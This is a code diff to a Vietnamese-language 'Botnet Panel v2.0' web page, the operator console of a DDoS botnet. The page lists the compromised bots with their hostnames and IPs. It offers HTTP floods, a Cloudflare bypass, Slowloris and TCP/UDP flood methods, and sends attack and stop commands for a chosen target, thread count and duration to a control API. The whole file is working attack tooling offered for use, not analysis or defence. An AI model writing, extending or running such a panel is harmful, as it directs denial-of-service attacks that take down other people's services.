@@ -2,108 +2,161 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Botnet Panel</title>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0a0a0a;color:#fff;font-family:Arial}
-        .header{background:#111;padding:15px;border-bottom:2px solid red}
-        .main{display:flex;height:calc(100vh - 60px)}
-        .sidebar{width:250px;background:#111;padding:15px;overflow-y:auto}
-        .content{flex:1;padding:20px}
-        .bot-item{background:#1a1a1a;padding:10px;margin:5px 0;border-radius:5px;cursor:pointer}
-        .bot-item:hover{background:#222}
-        .bot-item.online{border-left:3px solid #0f0}
-        .bot-item.offline{border-left:3px solid #555}
-        .bot-item.attacking{border-left:3px solid #f00}
-        input,select,button{padding:10px;margin:5px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:3px}
-        button{background:#c0392b;cursor:pointer;border:none;font-weight:bold}
-        button:hover{background:#e74c3c}
-        button.stop{background:#27ae60}
-        button.stop:hover{background:#2ecc71}
-        .log{background:#111;padding:10px;height:300px;overflow-y:auto;margin-top:10px;font-family:monospace;font-size:12px}
+        body{background:#0a0a0a;color:#fff;font-family:'Segoe UI',Arial}
+        .header{background:#111;padding:15px 20px;border-bottom:2px solid #e74c3c;display:flex;justify-content:space-between;align-items:center}
+        .header h1{color:#e74c3c;font-size:22px}
+        .header span{color:#aaa;font-size:14px}
+        .main{display:flex;height:calc(100vh - 55px)}
+        .sidebar{width:280px;background:#0f0f0f;padding:15px;overflow-y:auto;border-right:1px solid #222}
+        .sidebar h3{color:#e74c3c;margin-bottom:10px}
+        .bot-card{background:#1a1a1a;padding:12px;margin:8px 0;border-radius:6px;cursor:pointer;border-left:3px solid #555}
+        .bot-card.online{border-left-color:#2ecc71}
+        .bot-card.attacking{border-left-color:#e74c3c}
+        .bot-card.selected{background:#2a2a2a;border:1px solid #e74c3c}
+        .bot-card small{color:#888;display:block}
+        .content{flex:1;padding:25px}
+        .content h2{color:#e74c3c;margin-bottom:20px}
+        .form-group{margin-bottom:15px}
+        label{display:block;color:#aaa;margin-bottom:5px;font-size:13px}
+        select,input{padding:12px;background:#1a1a1a;color:#fff;border:1px solid #333;border-radius:4px;font-size:14px;width:100%}
+        .row{display:flex;gap:10px}
+        .row div{flex:1}
+        button{padding:12px 25px;margin:5px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;font-size:14px}
+        .btn-attack{background:#c0392b;color:#fff}
+        .btn-attack:hover{background:#e74c3c}
+        .btn-stop{background:#27ae60;color:#fff}
+        .btn-stop:hover{background:#2ecc71}
+        .btn-refresh{background:#2980b9;color:#fff;width:100%}
+        .log{background:#0f0f0f;padding:15px;height:250px;overflow-y:auto;margin-top:20px;border-radius:5px;font-family:Consolas;font-size:12px;color:#aaa}
+        .status{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:5px}
+        .status.online{background:#2ecc71}
+        .status.attacking{background:#e74c3c}
+        .status.offline{background:#555}
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>☠️ BOTNET PANEL</h1>
-        <span id="botCount">Bot: 0</span>
+        <h1>☠️ BOTNET PANEL v2.0</h1>
+        <span id="botCount">🤖 Bot: 0 | Online: 0</span>
     </div>
     <div class="main">
         <div class="sidebar">
             <h3>🤖 DANH SÁCH BOT</h3>
-            <button onclick="selectAll()">CHỌN TẤT CẢ</button>
+            <button class="btn-refresh" onclick="refreshBots()">🔄 LÀM MỚI</button>
+            <button class="btn-refresh" style="background:#555;margin-top:5px" onclick="selectAll()">✅ CHỌN TẤT CẢ</button>
             <div id="botList"></div>
         </div>
         <div class="content">
-            <h2>⚔️ TẤN CÔNG</h2>
-            <select id="layer">
-                <option value="L7">Layer 7 - HTTP</option>
-                <option value="L4">Layer 4 - TCP/UDP</option>
-            </select>
-            <select id="method">
-                <option value="GET_FLOOD">GET Flood</option>
-                <option value="POST_FLOOD">POST Flood</option>
-                <option value="CF_BYPASS">CF Bypass</option>
-                <option value="TCP_SYN">TCP SYN</option>
-                <option value="UDP_FLOOD">UDP Flood</option>
-            </select><br>
-            <input type="text" id="target" placeholder="Mục tiêu (URL hoặc IP:Port)" style="width:400px">
-            <input type="number" id="threads" placeholder="Số luồng" value="100">
-            <input type="number" id="duration" placeholder="Thời gian (s)" value="60"><br>
-            <button onclick="attack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button>
-            <button onclick="attack('SELECTED')">🎯 TẤN CÔNG BOT ĐÃ CHỌN</button>
-            <button class="stop" onclick="stop('ALL')">⏹ DỪNG TẤT CẢ</button>
-            <div class="log" id="log">[HỆ THỐNG] Đang kết nối server...</div>
+            <h2>⚔️ ĐIỀU KHIỂN TẤN CÔNG</h2>
+            <div class="form-group">
+                <label>🎯 MỤC TIÊU</label>
+                <input type="text" id="target" placeholder="http://target.com hoặc IP:Port">
+            </div>
+            <div class="row">
+                <div>
+                    <label>📂 LAYER</label>
+                    <select id="layer" onchange="changeMethods()">
+                        <option value="L7">Layer 7 - HTTP/HTTPS</option>
+                        <option value="L4">Layer 4 - TCP/UDP</option>
+                    </select>
+                </div>
+                <div>
+                    <label>⚔️ PHƯƠNG THỨC</label>
+                    <select id="method">
+                        <option value="GET_FLOOD">GET Flood</option>
+                        <option value="POST_FLOOD">POST Flood</option>
+                        <option value="CF_BYPASS">CF Bypass</option>
+                        <option value="SLOWLORIS">Slowloris</option>
+                        <option value="HEAD_FLOOD">HEAD Flood</option>
+                    </select>
+                </div>
+            </div>
+            <div class="row">
+                <div>
+                    <label>🧵 SỐ LUỒNG</label>
+                    <input type="number" id="threads" value="100">
+                </div>
+                <div>
+                    <label>⏱️ THỜI GIAN (giây)</label>
+                    <input type="number" id="duration" value="60">
+                </div>
+            </div>
+            <div style="margin-top:20px">
+                <button class="btn-attack" onclick="attack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button>
+                <button class="btn-attack" onclick="attack('SELECTED')">🎯 TẤN CÔNG BOT ĐÃ CHỌN</button>
+                <button class="btn-stop" onclick="stopAttack('ALL')">⏹ DỪNG TẤT CẢ</button>
+            </div>
+            <div class="log" id="log">[HỆ THỐNG] Sẵn sàng...</div>
         </div>
     </div>
 
     <script>
-        const socket = io();
-        let bots = {};
         let selectedBot = null;
+        let API = '/api';
 
-        socket.on('connect', () => {
-            document.getElementById('log').innerHTML += '<br>[OK] Kết nối server thành công!';
-        });
+        function log(msg) {
+            let l = document.getElementById('log');
+            l.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
+            l.scrollTop = l.scrollHeight;
+        }
 
-        socket.on('bot_list', (data) => {
-            bots = data;
-            updateBotList();
-        });
-
-        socket.on('attack_log', (data) => {
-            document.getElementById('log').innerHTML += '<br>[' + new Date().toLocaleTimeString() + '] ' + JSON.stringify(data);
-        });
-
-        function updateBotList() {
-            let html = '';
-            let count = 0;
-            for (let id in bots) {
-                let b = bots[id];
-                if (b.online) count++;
-                let cls = b.status === 'ATTACKING' ? 'attacking' : (b.online ? 'online' : 'offline');
-                html += `<div class="bot-item ${cls}" onclick="selectBot('${id}')" id="bot_${id}">
-                    <b>${b.hostname}</b><br>
-                    <small>${b.status} | ${b.ip}</small>
-                </div>`;
+        async function refreshBots() {
+            try {
+                let res = await fetch(API + '/bots');
+                let bots = await res.json();
+                let html = '';
+                let online = 0;
+                for (let id in bots) {
+                    let b = bots[id];
+                    if (b.online) online++;
+                    let cls = b.status === 'ATTACKING' ? 'attacking' : (b.online ? 'online' : '');
+                    let sel = (selectedBot === id) ? ' selected' : '';
+                    html += `<div class="bot-card ${cls}${sel}" onclick="selectBot('${id}')">
+                        <span class="status ${b.online ? 'online' : 'offline'}"></span>
+                        <b>${b.hostname}</b>
+                        <small>ID: ${id} | ${b.status}</small>
+                        <small>IP: ${b.ip} | ${b.target || 'Sẵn sàng'}</small>
+                    </div>`;
+                }
+                document.getElementById('botList').innerHTML = html || '<p style="color:#555">Chưa có bot nào</p>';
+                document.getElementById('botCount').innerHTML = `🤖 Bot: ${Object.keys(bots).length} | Online: ${online}`;
+            } catch(e) {
+                log('LỖI: Không kết nối được server');
             }
-            document.getElementById('botList').innerHTML = html || '<p>Chưa có bot</p>';
-            document.getElementById('botCount').innerText = 'Bot: ' + count;
         }
 
         function selectBot(id) {
             selectedBot = id;
-            document.querySelectorAll('.bot-item').forEach(el => el.style.background = '#1a1a1a');
-            document.getElementById('bot_' + id).style.background = '#333';
+            document.querySelectorAll('.bot-card').forEach(el => el.classList.remove('selected'));
+            let cards = document.querySelectorAll('.bot-card');
+            cards.forEach(c => { if (c.textContent.includes(id)) c.classList.add('selected'); });
+            log('Đã chọn bot: ' + id);
         }
 
         function selectAll() {
             selectedBot = 'ALL';
-            document.querySelectorAll('.bot-item').forEach(el => el.style.background = '#1a1a1a');
+            document.querySelectorAll('.bot-card').forEach(el => el.classList.remove('selected'));
+            log('Đã chọn TẤT CẢ bot');
         }
 
-        function attack(target) {
+        function changeMethods() {
+            let layer = document.getElementById('layer').value;
+            let method = document.getElementById('method');
+            method.innerHTML = '';
+            if (layer === 'L7') {
+                let m = ['GET_FLOOD','POST_FLOOD','CF_BYPASS','SLOWLORIS','HEAD_FLOOD','RANDOM_UA','MIXED_FLOOD'];
+                m.forEach(x => method.innerHTML += `<option value="${x}">${x}</option>`);
+            } else {
+                let m = ['TCP_SYN','TCP_CONNECT','UDP_FLOOD','TCP_ACK','TCP_RST','TCP_XMAS','SYN_ACK_MIX'];
+                m.forEach(x => method.innerHTML += `<option value="${x}">${x}</option>`);
+            }
+        }
+
+        async function attack(target) {
             let botId = target === 'ALL' ? 'ALL' : selectedBot;
             if (!botId) { alert('Chọn bot trước!'); return; }
             
@@ -116,22 +169,37 @@
                 duration: document.getElementById('duration').value
             };
             
-            fetch('/api/attack', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
+            if (!data.target) { alert('Nhập mục tiêu!'); return; }
             
-            document.getElementById('log').innerHTML += '<br>[LỆNH] Gửi tấn công: ' + JSON.stringify(data);
+            try {
+                let res = await fetch(API + '/attack', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                let result = await res.json();
+                log(`🚀 Lệnh tấn công đã gửi: ${data.method} → ${data.target} (${botId})`);
+            } catch(e) {
+                log('LỖI gửi lệnh!');
+            }
         }
 
-        function stop(target) {
-            fetch('/api/stop', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({botId: target === 'ALL' ? 'ALL' : selectedBot})
-            });
+        async function stopAttack(target) {
+            let botId = target === 'ALL' ? 'ALL' : selectedBot;
+            try {
+                await fetch(API + '/stop', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({botId: botId})
+                });
+                log('⏹ Lệnh dừng đã gửi: ' + botId);
+            } catch(e) {}
         }
+
+        // Tự động refresh mỗi 3 giây
+        setInterval(refreshBots, 3000);
+        refreshBots();
+        log('✅ Panel đã sẵn sàng');
     </script>
 </body>
 </html>
